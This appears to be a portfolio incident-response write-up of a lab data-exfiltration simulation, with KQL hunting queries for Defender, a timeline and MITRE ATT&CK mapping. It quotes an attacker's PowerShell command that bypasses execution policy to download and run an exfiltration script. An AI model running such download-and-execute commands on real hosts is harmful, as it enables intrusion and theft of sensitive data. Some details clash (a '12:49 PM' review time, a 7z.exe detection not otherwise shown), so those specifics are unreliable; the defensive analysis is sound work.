# 🛰️ Data Exfiltration Simulation — Incident Response & Detection

**Project Type:** Threat Hunting / Incident Response  
**Date Investigated:** June 21, 2025  
**Tooling:** Microsoft Defender for Endpoint (MDE), KQL (Advanced Hunting), CSV Log Analysis  
**Tags:** `PowerShell`, `Data Exfiltration`, `MITRE ATT&CK`, `Portfolio Project`

---

## 🔍 Overview

In this project, I investigated **suspected data exfiltration** behavior originating from an internal host (`khajitwares`) on the network. Through log analysis and advanced hunting queries, I was able to track the user's activity from the staging of sensitive files to the attempted use of a malicious PowerShell script.

---

## 🧪 Initial Discovery

### 🔹 File Staging

A series of sensitive files were created and staged by the user around **12:13 AM EST**, including:

- `6157_EmployeeRecords.xlsx`
- `9592_CompanyFinancials_2025.xlsx`
- `6036_ProjectList_pwncry.csv`

![image](https://github.com/user-attachments/assets/59365234-eed9-4a9d-8482-378795ff63f2)

[Device File Events Logs](https://drive.google.com/file/d/1zwpaUh1gYOSdzXuPEkvpjMLYO2dywsR0/view?usp=sharing)

These files were stored in paths such as `C:\Users\labuser\Desktop\exfil\` — highly indicative of intent to exfiltrate.

---

### 🔹 Script Download and Execution

At **12:49 AM**, the attacker executed a PowerShell script named `exfiltratedata.ps1` from GitHub using the following command:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../exfiltratedata.ps1 -OutFile C:\ProgramData\exfiltratedata.ps1
```

We know this based on new file creation logs:
Jun 21, 2025 12:49:00 AM
File Created: employee-data-temp2025.csv
Path: C:\ProgramData\employeedata
Initiated By: powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\exfiltratedata.ps1

![image](https://github.com/user-attachments/assets/0c06c774-ba3e-4797-9e7c-85da2f80d254)



### 📊 Timeline Summary 

| Time (EST)   | Event                                                              |
| ------------ | ------------------------------------------------------------------ |
| **11:31 PM** | Sensitive files manually created (CSV/XLSX)                        |
| **12:13 AM** | Sensitive files manually created (CSV/XLSX)                        |
| **12:49 AM** | Script executes and creates new file: `employee-data-temp2025.csv` |



### 🧾 Detection Queries (KQL)


🔹 Search for Script Execution

```
DeviceProcessEvents
| where DeviceName == "khajitwares"
| where timestamp > ago(1d)
| where InitiatingProcessCommandLine has "exfiltratedata.ps1"
```
![image](https://github.com/user-attachments/assets/ed624b24-6f4c-4b21-b587-c91a36ff54bd)


🔹 Review Network Activity Post-Script

```
DeviceNetworkEvents
| where DeviceName == "khajitwares"
| where Timestamp between (datetime(2025-06-21T00:49:00Z) .. datetime(2025-06-21T01:00:00Z))
| order by Timestamp desc
```

Nothing out of the ordinary was spotted following the above Query

🔹 Sensitive File Access Review

```
DeviceFileEvents
| where DeviceName == "khajitwares"
| where Timestamp > datetime(2025-06-21T00:47:00Z)
| where FileName endswith ".csv" or FileName endswith ".xlsx" or FileName endswith ".docx" or FileName endswith ".pdf" or FileName endswith ".txt"
| where ActionType in ("FileRead", "FileCreated", "FileModified", "FileAccessed", "FileDeleted")
| project Timestamp, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

![image](https://github.com/user-attachments/assets/a20cd99f-c3bb-41e5-b46a-cf0a194d02c1)


### 🚫 Final Outcome

Despite staging sensitive business data and executing a data exfiltration script, no evidence of actual data transfer was identified. Network logs reviewed from 12:49 PM onward revealed no new or suspicious outbound connections during the timeframe expected for exfiltration.



### 🔁 Confirmed MITRE ATT&CK Techniques
| Technique ID  | Name                   | Description / Evidence                      |
| ------------- | ---------------------- | ------------------------------------------- |
| **T1059.001** | PowerShell             | Used to invoke and execute the exfil script |
| **T1105**     | Remote File Copy       | Script downloaded from GitHub               |
| **T1560.001** | Archive via Utility    | `7z.exe` usage detected                     |
| **T1020**     | Automated Exfiltration | Script behavior implies automation          |
| **T1005**     | Data from Local System | Sensitive business data accessed            |
